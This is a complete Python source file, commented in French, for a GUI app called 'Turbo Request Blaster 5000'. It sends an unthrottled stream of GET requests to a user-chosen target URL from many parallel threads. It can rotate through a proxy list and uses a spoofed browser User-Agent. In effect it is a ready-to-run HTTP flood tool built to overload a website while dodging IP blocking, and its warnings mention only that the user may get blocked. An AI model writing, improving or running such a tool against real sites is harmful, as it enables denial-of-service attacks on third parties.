import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import requests
import os
import threading
import queue
import time # Ajouté pour petits délais potentiels
import itertools # Ajouté pour cycler les proxies

# --- Fonctions Logiques (peu modifiées) ---
# (Les fonctions charger_proxies et envoyer_requete restent identiques à la version précédente)

def charger_proxies(chemin_fichier, log_queue):
    """ Charge les proxies et met les messages de log dans la queue. """
    proxies = []
    if not os.path.exists(chemin_fichier):
        log_queue.put(f"ERREUR : Le fichier '{chemin_fichier}' n'existe pas.")
        return None

    try:
        with open(chemin_fichier, 'r') as f:
            for ligne in f:
                ligne_nettoyee = ligne.strip()
                if ligne_nettoyee:
                    proxies.append(ligne_nettoyee)
        if not proxies:
            log_queue.put(f"ATTENTION : Le fichier '{chemin_fichier}' est vide ou ne contient pas de proxies.")
            return None
        log_queue.put(f"Succès : {len(proxies)} proxies chargés depuis '{chemin_fichier}'.")
        return proxies
    except Exception as e:
        log_queue.put(f"ERREUR : Impossible de lire le fichier de proxies '{chemin_fichier}'. Détail : {e}")
        return None

def envoyer_requete(url, proxy=None, timeout=10):
    """
    Envoie une requête GET.
    Retourne: (succès (bool), statut_code (int/None), message_pour_log (str))
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    proxies_dict = None
    # Modification pour inclure le worker ID dans le futur log si nécessaire
    log_prefix = f"[{proxy if proxy else 'Direct'}] -> {url}"

    if proxy:
        proxies_dict = {'http': proxy, 'https': proxy}

    try:
        response = requests.get(url, headers=headers, proxies=proxies_dict, timeout=timeout)
        response.raise_for_status()
        message = f"{log_prefix} | SUCCES | Statut: {response.status_code}"
        return (True, response.status_code, message)

    except requests.exceptions.Timeout:
        erreur = f"{log_prefix} | ECHEC | Timeout ({timeout}s dépassé)"
        return (False, None, erreur)
    except requests.exceptions.ProxyError as e:
        erreur = f"{log_prefix} | ECHEC | Erreur Proxy: {str(e).split(':')[-1].strip()}"
        return (False, None, erreur)
    except requests.exceptions.ConnectionError as e:
        erreur = f"{log_prefix} | ECHEC | Erreur Connexion: {str(e).split(':')[-1].strip()}"
        return (False, None, erreur)
    except requests.exceptions.HTTPError as e:
        statut = e.response.status_code if hasattr(e, 'response') else 'N/A'
        erreur = f"{log_prefix} | ECHEC | Erreur HTTP {statut}"
        return (False, statut, erreur)
    except requests.exceptions.RequestException as e:
        erreur = f"{log_prefix} | ECHEC | Erreur Requête: {type(e).__name__}"
        return (False, None, erreur)
    except Exception as e:
        erreur = f"{log_prefix} | ECHEC | Erreur Python: {type(e).__name__}"
        return (False, None, erreur)


# --- Classe de l'Application GUI ---

class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Turbo Request Blaster 5000 (Utiliser avec précaution!)")
        self.geometry("750x700")

        ctk.set_appearance_mode("System")
        ctk.set_default_color_theme("blue")

        # Variables
        self.proxy_file_path = tk.StringVar()
        self.request_mode = tk.StringVar(value="direct")
        self.num_threads_var = tk.StringVar(value="10") # Nombre de threads par défaut
        self.log_queue = queue.Queue()
        self.stop_event = threading.Event() # Pour signaler l'arrêt aux threads
        self.threads = [] # Pour garder une référence aux threads actifs
        self.active_thread_count = 0 # Pour savoir quand tous les threads se sont arrêtés

        # --- Layout ---
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(4, weight=1) # Log area row

        # --- Widgets ---

        # Frame Inputs
        self.input_frame = ctk.CTkFrame(self)
        self.input_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        self.input_frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(self.input_frame, text="URL Cible:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.url_entry = ctk.CTkEntry(self.input_frame, placeholder_text="https://example.com")
        self.url_entry.grid(row=0, column=1, columnspan=3, padx=5, pady=5, sticky="ew")

        # Frame Mode & Proxies
        self.mode_frame = ctk.CTkFrame(self)
        self.mode_frame.grid(row=1, column=0, padx=10, pady=(0, 10), sticky="nsew")
        self.mode_frame.grid_columnconfigure(3, weight=1) # Give space to label

        ctk.CTkLabel(self.mode_frame, text="Mode:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.direct_radio = ctk.CTkRadioButton(self.mode_frame, text="IP Directe", variable=self.request_mode, value="direct", command=self.toggle_proxy_widgets)
        self.direct_radio.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        self.proxy_radio = ctk.CTkRadioButton(self.mode_frame, text="Proxies", variable=self.request_mode, value="proxy", command=self.toggle_proxy_widgets)
        self.proxy_radio.grid(row=0, column=2, padx=5, pady=5, sticky="w")

        self.proxy_file_button = ctk.CTkButton(self.mode_frame, text="Choisir Fichier Proxy", command=self.select_proxy_file, state=tk.DISABLED)
        self.proxy_file_button.grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.proxy_file_label = ctk.CTkLabel(self.mode_frame, textvariable=self.proxy_file_path, text_color="gray", wraplength=450)
        self.proxy_file_label.grid(row=1, column=1, columnspan=3, padx=5, pady=5, sticky="w")

        # Frame Contrôles (Threads, Start, Stop)
        self.control_frame = ctk.CTkFrame(self)
        self.control_frame.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
        self.control_frame.grid_columnconfigure((1, 2), weight=1) # Give weight to buttons

        ctk.CTkLabel(self.control_frame, text="Threads Parallèles:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.threads_entry = ctk.CTkEntry(self.control_frame, textvariable=self.num_threads_var, width=50)
        self.threads_entry.grid(row=0, column=1, padx=5, pady=5, sticky="w")

        self.start_button = ctk.CTkButton(self.control_frame, text="Démarrer (Continu)", command=self.start_requests)
        self.start_button.grid(row=0, column=2, padx=5, pady=5, sticky="ew")

        self.stop_button = ctk.CTkButton(self.control_frame, text="Stop", command=self.stop_requests, state=tk.DISABLED, fg_color="red", hover_color="darkred")
        self.stop_button.grid(row=0, column=3, padx=5, pady=5, sticky="ew")


        # Zone de Log
        self.log_textbox = ctk.CTkTextbox(self, state=tk.DISABLED, wrap=tk.WORD)
        self.log_textbox.grid(row=3, column=0, padx=10, pady=(0, 5), sticky="nsew")

        # Label de statut
        self.status_label = ctk.CTkLabel(self, text="Prêt.")
        self.status_label.grid(row=4, column=0, padx=10, pady=(0,10), sticky="w")

        # Démarrer la surveillance de la queue
        self.process_queue()

        # Message d'avertissement initial
        self.log_message("AVERTISSEMENT : Utiliser cet outil de manière intensive peut bloquer votre IP ou vos proxies.")
        self.log_message("Ne l'utilisez que de manière responsable et éthique.")


    # --- Méthodes ---

    def toggle_proxy_widgets(self):
        if self.request_mode.get() == "proxy":
            self.proxy_file_button.configure(state=tk.NORMAL)
        else:
            self.proxy_file_button.configure(state=tk.DISABLED)

    def select_proxy_file(self):
        filepath = filedialog.askopenfilename(
            title="Sélectionner le fichier de proxies",
            filetypes=[("Fichiers Texte", "*.txt"), ("Tous les fichiers", "*.*")]
        )
        if filepath:
            self.proxy_file_path.set(filepath)
            self.log_message(f"Fichier proxy sélectionné : {filepath}")

    def log_message(self, message):
        self.log_queue.put(message)

    def update_log_display(self, message):
         self.log_textbox.configure(state=tk.NORMAL)
         # Limiter la taille du log pour éviter les problèmes de performance
         # Si le log devient trop grand, on supprime les lignes les plus anciennes
         num_lines = int(self.log_textbox.index('end-1c').split('.')[0])
         if num_lines > 2000: # Limite à 2000 lignes (ajustable)
             self.log_textbox.delete("1.0", "2.0") # Supprime la première ligne
         self.log_textbox.insert(tk.END, message + "\n")
         self.log_textbox.configure(state=tk.DISABLED)
         self.log_textbox.see(tk.END) # Scroll vers le bas

    def start_requests(self):
        url = self.url_entry.get().strip()
        mode = self.request_mode.get()
        proxy_file = self.proxy_file_path.get()

        # Validation Nombre de Threads
        try:
            num_threads = int(self.num_threads_var.get())
            if num_threads <= 0:
                raise ValueError("Le nombre de threads doit être positif.")
        except ValueError as e:
            messagebox.showerror("Erreur d'Entrée", f"Nombre de threads invalide: {e}")
            return

        if not url:
            messagebox.showerror("Erreur d'Entrée", "Veuillez entrer une URL cible.")
            return

        if mode == "proxy" and not proxy_file:
            messagebox.showerror("Erreur d'Entrée", "Veuillez sélectionner un fichier de proxies.")
            return

        # Charger les proxies (si nécessaire) AVANT de démarrer les threads
        proxies = []
        if mode == "proxy":
            if not os.path.exists(proxy_file):
                 messagebox.showerror("Erreur Fichier", f"Le fichier proxy '{proxy_file}' n'a pas été trouvé.")
                 return
            # Utiliser une queue temporaire juste pour le chargement
            temp_queue = queue.Queue()
            proxies = charger_proxies(proxy_file, temp_queue)
             # Afficher les logs de chargement
            try:
                while True: self.log_message(temp_queue.get_nowait())
            except queue.Empty: pass

            if not proxies:
                self.log_message("Échec du chargement des proxies. Démarrage annulé.")
                self.status_label.configure(text="Erreur chargement proxies.")
                return

        # Préparer le démarrage
        self.stop_event.clear() # Assurer que le signal d'arrêt est désactivé
        self.threads = []
        self.active_thread_count = num_threads

        # Nettoyer le log (optionnel, peut être utile de garder l'ancien)
        # self.log_textbox.configure(state=tk.NORMAL)
        # self.log_textbox.delete("1.0", tk.END)
        # self.log_textbox.configure(state=tk.DISABLED)

        self.status_label.configure(text=f"Démarrage de {num_threads} threads...")
        self.start_button.configure(state=tk.DISABLED)
        self.stop_button.configure(state=tk.NORMAL)
        self.log_message(f"--- Démarrage de l'envoi continu ({num_threads} threads) ---")

        # Démarrer les threads travailleurs
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.run_worker,
                args=(i + 1, url, mode, proxies, self.stop_event, self.log_queue), # Passer la liste de proxies
                daemon=True # Permet au programme principal de quitter même si les threads tournent
            )
            self.threads.append(thread)
            thread.start()

        self.status_label.configure(text=f"En cours... ({num_threads} threads actifs)")

    def stop_requests(self):
        """ Signale à tous les threads de s'arrêter. """
        if not self.threads:
            return

        self.log_message("--- Signal d'arrêt envoyé ---")
        self.status_label.configure(text="Arrêt en cours...")
        self.stop_event.set() # Déclencher l'événement d'arrêt
        self.stop_button.configure(state=tk.DISABLED)
        # Le bouton Start sera réactivé dans process_queue quand tous les threads auront signalé leur fin


    def run_worker(self, worker_id, url, mode, proxy_list, stop_event, log_queue):
        """ Fonction exécutée par chaque thread travailleur. """
        request_count = 0
        # Créer un cycleur de proxy pour ce thread spécifique si nécessaire
        proxy_cycle = itertools.cycle(proxy_list) if mode == "proxy" and proxy_list else None
        worker_log_prefix = f"[Thread-{worker_id}]"

        try:
            while not stop_event.is_set():
                proxy_to_use = None
                current_log_prefix = worker_log_prefix # Base log prefix

                if mode == "proxy":
                    if not proxy_cycle:
                        log_queue.put(f"{worker_log_prefix} Pas de proxies disponibles. Arrêt.")
                        break
                    try:
                        # Important: Obtenir le prochain proxy AVANT l'envoi
                        proxy_to_use = next(proxy_cycle)
                        current_log_prefix = f"[{proxy_to_use}]" # Mettre à jour le préfixe pour le log de cette requête
                    except StopIteration:
                        # Ne devrait pas arriver avec itertools.cycle mais sécurité
                        log_queue.put(f"{worker_log_prefix} Cycle de proxy terminé (inattendu). Arrêt.")
                        break

                # Envoyer la requête
                # Ajouter le worker_id ou proxy au message retourné par envoyer_requete n'est pas trivial
                # On va préfixer le message reçu ici
                succes, status_code, log_msg_core = envoyer_requete(url, proxy=proxy_to_use)
                final_log_msg = f"{worker_log_prefix} {log_msg_core}" # Préfixer avec l'ID du thread

                log_queue.put(final_log_msg) # Envoyer le log formaté
                request_count += 1

                # Optionnel : petit délai pour éviter 100% CPU si les requêtes sont instantanées
                # time.sleep(0.01)

        except Exception as e:
            # Capturer les erreurs inattendues dans la boucle du worker
            log_queue.put(f"{worker_log_prefix} ERREUR INATTENDUE dans la boucle: {e}")
        finally:
            # Ce message est envoyé quand le thread sort de la boucle (arrêt demandé ou erreur)
            log_queue.put(f"{worker_log_prefix} Arrêté. {request_count} requêtes envoyées par ce thread.")
            log_queue.put(("thread_finished", worker_id)) # Signaler la fin de CE thread

    def process_queue(self):
        """ Traite les messages de la queue pour mettre à jour l'interface. """
        try:
            # Traiter plusieurs messages pour améliorer la réactivité si beaucoup arrivent
            for _ in range(100): # Traiter jusqu'à 100 messages par cycle
                item = self.log_queue.get_nowait()

                if isinstance(item, tuple):
                    command, value = item
                    if command == "thread_finished":
                        self.active_thread_count -= 1
                        self.status_label.configure(text=f"Arrêt... {self.active_thread_count} threads restants.")
                        if self.active_thread_count <= 0:
                            self.status_label.configure(text="Arrêté.")
                            self.start_button.configure(state=tk.NORMAL) # Réactiver Start SEULEMENT quand TOUT est arrêté
                            self.stop_button.configure(state=tk.DISABLED) # Garder Stop désactivé
                            self.threads = [] # Nettoyer la liste des threads
                            self.log_message("--- Tous les threads sont arrêtés ---")
                    # Ajouter d'autres commandes si nécessaire (ex: compteur global)

                elif isinstance(item, str):
                    # C'est un message de log normal
                    self.update_log_display(item)
                # Ignorer les autres types pour l'instant

        except queue.Empty: # Pas (plus) de message en attente
            pass
        except Exception as e:
             # Éviter qu'une erreur dans le traitement de la queue ne bloque l'UI
             print(f"Erreur dans process_queue: {e}") # Afficher dans la console pour le debug
             self.log_message(f"Erreur interne GUI: {e}") # Aussi dans le log GUI
        finally:
            # Se replanifier pour vérifier à nouveau bientôt
            self.after(100, self.process_queue) # Vérifie toutes les 100ms


# --- Point d'entrée ---
if __name__ == "__main__":
    app = App()
    app.mainloop()